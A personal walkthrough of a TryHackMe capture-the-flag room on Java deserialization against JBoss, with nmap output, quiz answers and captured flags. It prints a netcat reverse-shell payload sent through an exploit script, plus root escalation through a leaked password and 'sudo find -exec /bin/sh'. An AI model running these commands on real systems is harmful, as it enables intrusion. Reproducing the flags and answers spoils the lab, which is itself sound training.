IP: 10.10.51.96

Nmap scan results:

root@LAPTOP-U5913CMD:/home/akshay/Desktop/tonythetiger# nmap -A -T4  10.10.51.96
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 21:08 IST
Nmap scan report for 10.10.51.96
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Hugo 0.66.0
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Tony&#39;s Blog
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/10%OT=22%CT=1%CU=31558%PV=Y%DS=2%DC=T%G=Y%TM=5FAAB4
OS:07%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST
OS:11NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G

This room explains about JAVA Serialization attack.


Whilst this is a CTF-style room, as the approach to ultimately "rooting" the box is new to TryHackMe, I will explain it a little and leave you to experiment with. There are flags laying around that aren't focused on the CVE, so I still encourage exploring this room. Explaining the whole-theory behind it is a little out of scope for this. However, I have provided some further reading material that may help with the room - or prove interesting!


What is "Serialisation"?

Serialisation at an abstract is the process of converting data - specifically "Objects" in Object-Oriented Programming (OOP) languages such as Java into lower-level formatting known as "byte streams", where it can be stored for later use such as within files, databases, and/or traversed across a network. It is then later converted from this "byte stream" back into the higher-level "Object". This final conversion is known as "De-serialisation"


Basic questions:

What is a great IRL example of an "Object"?
-> lamp

What is the acronym of a possible type of attack resulting from a "serialisation" attack?
->DoS

What lower-level format does data within "Objects" get converted into?
-> byte streams


Reconnaisance:

What service is running on port "8080"
-> Apache Tomcat/Coyote JSP engine 1.1

What is the name of the front-end application running on "8080"?
-> JBoss


Finding Tony's flag:
root@LAPTOP-U5913CMD:/home/akshay/Desktop/tonythetiger# strings be2sOV9.jpg | grep "THM"
}THM{Tony_Sure_Loves_Frosted_Flakes}
'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ
root@LAPTOP-U5913CMD:/home/akshay/Desktop/tonythetiger#



Lets get started with EXploiting the machine.

root@LAPTOP-U5913CMD:/home/akshay/Desktop/tonythetiger/jboss# python exploit.py  10.10.68.234:8080 "nc -e /bin/sh 10.9.81.62 1234"
[*] Target IP: 10.10.68.234
[*] Target PORT: 8080
[+] Command executed successfully


python3 -c "import pty;pty.spawn('/bin/bash')"
cmnatic@thm-java-deserial:/$ id
id
uid=1000(cmnatic) gid=1000(cmnatic) groups=1000(cmnatic),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
cmnatic@thm-java-deserial:/$


cmnatic@thm-java-deserial:/home/jboss$ ls -la
ls -la
total 36
drwxr-xr-x 3 jboss   jboss   4096 Mar  7  2020 .
drwxr-xr-x 5 root    root    4096 Mar  6  2020 ..
-rwxrwxrwx 1 jboss   jboss    181 Mar  7  2020 .bash_history
-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 jboss   jboss   3637 Mar  6  2020 .bashrc
drwx------ 2 jboss   jboss   4096 Mar  7  2020 .cache
-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note
cmnatic@thm-java-deserial:/home/jboss$ cat .jboss.txt
cat .jboss.txt
THM{50c10ad46b5793704601ecdad865eb06}
cmnatic@thm-java-deserial:/home/jboss$


cmnatic@thm-java-deserial:/home/jboss$ cat note
cat note
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
cmnatic@thm-java-deserial:/home/jboss$


cmnatic@thm-java-deserial:/home/jboss$ su jboss
su jboss
Password: likeaboss

jboss@thm-java-deserial:~$ id
id
uid=1001(jboss) gid=1001(jboss) groups=1001(jboss)
jboss@thm-java-deserial:~$ ls -la
ls -la
total 36
drwxr-xr-x 3 jboss   jboss   4096 Mar  7  2020 .
drwxr-xr-x 5 root    root    4096 Mar  6  2020 ..
-rwxrwxrwx 1 jboss   jboss    181 Mar  7  2020 .bash_history
-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 jboss   jboss   3637 Mar  6  2020 .bashrc
drwx------ 2 jboss   jboss   4096 Mar  7  2020 .cache
-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note
-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
jboss@thm-java-deserial:~$


jboss@thm-java-deserial:~$ sudo -l
sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
jboss@thm-java-deserial:~$ sudo /usr/bin/find . -exec "/bin/sh" \;
sudo /usr/bin/find . -exec "/bin/sh" \;
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
cd /root
# cat root.txt
cat root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
#

BC77AC072EE30E3760806864E234C7CF

This is a md5 hash and I got the flag for that on crackstation.net

BC77AC072EE30E3760806864E234C7CF        md5     zxcvbnm123456789
